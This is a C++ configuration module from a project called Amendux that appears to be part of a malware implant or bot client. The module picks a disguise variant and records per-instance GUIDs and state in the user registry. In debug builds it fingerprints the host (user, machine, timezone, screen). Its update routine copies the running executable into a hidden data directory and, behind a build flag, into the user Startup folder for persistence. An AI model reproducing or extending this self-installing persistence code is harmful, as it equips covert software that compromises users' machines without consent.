#include "stdafx.h"
#include "Log.h"
#include "RegDB.h"
#include "Config.h"

#if DEBUG
#define LogCurrentMode()	Log::Info(L"Config", L"Mode: " + Config::ModeName() + L" (" + std::to_wstring((int)currentMode) + L")");
#else
#define LogCurrentMode()
#endif

using namespace Amendux;

Config *Config::s_Config = nullptr;

Config::Config()
{
	Log::Info(L"Config", L"Initialize config class");

	// Encrypt module settings
	{
		// HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux\\Crypt");
		// LPBYTE dRsPubkey = RegDB::getValue<LPBYTE>(hRoot, REG_BINARY, L"clientPubkey", crypto_box_PUBLICKEYBYTES);
		// LPBYTE dRsPrivkey = RegDB::getValue<LPBYTE>(hRoot, REG_BINARY, L"clientPrivkey", crypto_box_SECRETKEYBYTES);
		// if (!dRsPubkey || !dRsPrivkey) {
		// encrypt.genLocalKeypair();

		// RegDB::setValue<LPBYTE>(hRoot, REG_BINARY, L"clientPubkey", encrypt.clientPublickey(), crypto_box_PUBLICKEYBYTES);
		// RegDB::setValue<LPBYTE>(hRoot, REG_BINARY, L"clientPrivkey", encrypt.clientPrivatekey(), crypto_box_SECRETKEYBYTES);

		// Log::Info(L"Config", L"Client keys generated and set");
		// }
		// else {
		// encrypt.setLocalKeypair(dRsPubkey, dRsPrivkey);
		// }
	}
}


Config::~Config()
{
	Log::Info(L"Config", L"Terminate config class");
}


void Config::InitClass()
{
	LogCurrentMode();

	mainThreadId = ::GetCurrentThreadId();

	switch (currentMode) {
		case Amendux::OperationMode::BASE:

			SetupPersistentConfig();
			SetupDataDir();

			LogEnvironment();
			break;
		case Amendux::OperationMode::UPDATE:

			CheckObsoleteConfig();//TODO needs variant
			ApplyUpdate();

			LogEnvironment();
			break;
		case Amendux::OperationMode::ELIMINATE:
			break;
		case Amendux::OperationMode::GUARD:
			
			BasicConfig();

			LogEnvironment();
			break;
		default:
			break;
	}
}


void Config::LogEnvironment()
{
#ifdef DEBUG
	if (!bSuccess) {
		Log::Info(L"Config", L"[Env] Current configuration failed, skip envlog");
		return;
	}

	Log::Info(L"Config", L"[Env] PID: " + std::to_wstring(Util::currentProcessId()));
	Log::Info(L"Config", L"[Env] Version: " + Config::getVersion());
	Log::Info(L"Config", L"[Env] Variant: " + Config::DisplayName());
	Log::Info(L"Config", L"[Env] GUID: " + Config::instanceGUID);
	Log::Info(L"Config", L"[Env] Windows version: " + Util::winver());
	Log::Info(L"Config", L"[Env] CPU cores: " + std::to_wstring(Util::cpuCores()));
	Log::Info(L"Config", L"[Env] Max memory: " + std::to_wstring(Util::maxmem()));
	Log::Info(L"Config", L"[Env] User: " + Util::user());
	Log::Info(L"Config", L"[Env] Computer: " + Util::machine());
	Log::Info(L"Config", L"[Env] Screen resolution: " + Util::windowResolution());
	Log::Info(L"Config", L"[Env] Timezone: " + Util::timezoneName());
	Log::Info(L"Config", L"[Env] Data directory: " + DataDirectory());
#endif
}


void Config::SetupDataDir()
{
	if (!Util::createDirectory(DataDirectory())) {
		Log::Error(L"Config", L"Cannot create data directory");

		bSuccess = false;
	}
}


unsigned int FindActiveVariant()
{
	for (int i = 0; i < variantCount(); ++i) {
		HKEY hCurKey = RegDB::createKey(HKEY_CURRENT_USER, Variant::getRegister(i));

		/* Variant mode */
		DWORD *dRsexecMode = (DWORD *)RegDB::getValue<LPBYTE>(hCurKey, REG_DWORD, L"ExecMode", sizeof(DWORD));
		if (dRsexecMode) {
			RegDB::closeKey(hCurKey);
			return *dRsexecMode;
		}

		RegDB::closeKey(hCurKey);
	}
		
	return VARIANT_INVALID;
}


void Config::SetupPersistentConfig()
{
	HKEY hRoot = nullptr;

	variant = FindActiveVariant();
	if (variant == VARIANT_INVALID) {
		variant = Variant::pickVariant();
	}

	hRoot = RegDB::createKey(HKEY_CURRENT_USER, Variant::getRegister(variant));
	DWORD execMode = variant;
	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"ExecMode", &execMode, sizeof(DWORD));

	/* Intance GUID */
	LPBYTE dRsTempPath = RegDB::getValue<LPBYTE>(hRoot, REG_SZ, L"Instance", 39 * sizeof(wchar_t));
	if (!dRsTempPath) {
		std::wstring guid = Util::generateUUID();
		instanceGUID = guid;

		LPCWSTR newTempPath = guid.c_str();
		RegDB::setValue<LPCWSTR>(hRoot, REG_SZ, L"Instance", newTempPath, static_cast<DWORD>(Util::bytesInWCharStr(newTempPath)));
	} else {
		instanceGUID = std::wstring(reinterpret_cast<PWCHAR>(dRsTempPath), 76 / sizeof(wchar_t));
	}

	/* Running procedure, must be 1 */
	DWORD procInit = 1;
	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"InitProcedure", &procInit, sizeof(DWORD));

	/* Always write build number */
	DWORD build = clientVersion;
	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"Build", &build, sizeof(DWORD));

#if DEBUG
	/* Startup couter */
	DWORD *dRsRunCount = (DWORD *)RegDB::getValue<LPBYTE>(hRoot, REG_DWORD, L"RunCount", sizeof(DWORD));
	if (!dRsRunCount) {
		DWORD runCount = 1;
		RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"RunCount", &runCount, sizeof(DWORD));
	} else {
		DWORD RunCount = *dRsRunCount + 1;
		RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"RunCount", &RunCount, sizeof(DWORD));
	}

	/* Debug info */
	DWORD debugMode = 1;
	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"Debug", &debugMode, sizeof(DWORD));
	RegDB::setValue<LPCWSTR>(hRoot, REG_SZ, L"DisplayName", DisplayName().c_str(), (DWORD)DisplayName().size() * sizeof(wchar_t));
	RegDB::setValue<LPCWSTR>(hRoot, REG_SZ, L"ExeName", ExeName().c_str(), (DWORD)ExeName().size() * sizeof(wchar_t));
	RegDB::setValue<LPCWSTR>(hRoot, REG_SZ, L"Path", DataDirectory().c_str(), (DWORD)(DataDirectory().size() * sizeof(wchar_t)));

	/* Operation flags */
	BYTE flags = 0xfe;
	RegDB::setValue<LPBYTE>(hRoot, REG_BINARY, L"Flags", &flags, sizeof(BYTE));
#endif

	RegDB::closeKey(hRoot);
}


void Config::CheckObsoleteConfig()
{
	HKEY hRoot = nullptr;

	variant = FindActiveVariant();
	if (variant == VARIANT_INVALID) {
		bSuccess = false;
		return;
	}

	hRoot = RegDB::createKey(HKEY_CURRENT_USER, Variant::getRegister(variant));

	LPBYTE dRsTempPath = RegDB::getValue<LPBYTE>(hRoot, REG_SZ, L"Instance", 39 * sizeof(wchar_t));
	if (!dRsTempPath) {
		RegDB::closeKey(hRoot);

		bSuccess = false;
		return;
	}
	
	instanceGUID = std::wstring(reinterpret_cast<PWCHAR>(dRsTempPath), 76 / sizeof(wchar_t));

	DWORD *procInit = (DWORD *) RegDB::getValue<LPBYTE>(hRoot, REG_DWORD, L"InitProcedure", sizeof(DWORD));
	if (!*procInit || *procInit != 1) {
		RegDB::closeKey(hRoot);

		bSuccess = false;
		return;
	}

	DWORD *build = (DWORD *) RegDB::getValue<LPBYTE>(hRoot, REG_DWORD, L"Build", sizeof(DWORD));
	if (!*build || *build >= clientVersion) {
		RegDB::closeKey(hRoot);

		bSuccess = false;
		return;
	}

	RegDB::closeKey(hRoot);
}


void Config::ApplyUpdate() // TOTEST
{
	if (!bSuccess) {
		return;
	}
	
	Log::Info(L"Config", L"Applying update");

	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, Variant::getRegister(variant));

	std::wstring startupDir = Util::getDirectory(Util::Directory::USER_STARTUP);
	std::wstring curExec = Util::currentModule();
	std::wstring appDir = Config::Current()->DataDirectory();
	std::wstring curDir = Util::CurrentDirectory();

	if (appDir == curDir) {
		return;
	}

	appDir += L"\\" + Config::Current()->ExeName();

	Util::deleteFile(appDir.c_str());
	Util::CopyFile((wchar_t *)curExec.c_str(), (wchar_t *)appDir.c_str());

#if SECURE_DOUBLE_BOOT
	//TODO
	startupDir += L"\\AmenduxGuard.exe";

	Util::deleteFile(startupDir.c_str());
	Util::CopyFile((wchar_t *)curExec.c_str(), (wchar_t *)startupDir.c_str());
#endif

	DWORD build = clientVersion;
	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"Build", &build, sizeof(DWORD));

	PostQuitMessage(0);

	RegDB::closeKey(hRoot);
}


void Config::BasicConfig()
{
	HKEY hRoot = nullptr;

	variant = FindActiveVariant();
	if (variant == VARIANT_INVALID) {
		bSuccess = false;
		return;
	}

	hRoot = RegDB::createKey(HKEY_CURRENT_USER, Variant::getRegister(variant));

	/* Intance GUID */
	LPBYTE dRsTempPath = RegDB::getValue<LPBYTE>(hRoot, REG_SZ, L"Instance", 39 * sizeof(wchar_t));
	if (!dRsTempPath) {
		RegDB::closeKey(hRoot);

		bSuccess = false;
		return;
	}

	instanceGUID = std::wstring(reinterpret_cast<PWCHAR>(dRsTempPath), 76 / sizeof(wchar_t));

	/* Running procedure, must be 1 */
	DWORD *procInit = (DWORD *)RegDB::getValue<LPBYTE>(hRoot, REG_DWORD, L"InitProcedure", sizeof(DWORD));
	if (!procInit || *procInit != 1) {
		RegDB::closeKey(hRoot);

		bSuccess = false;
		return;
	}

	RegDB::closeKey(hRoot);
}
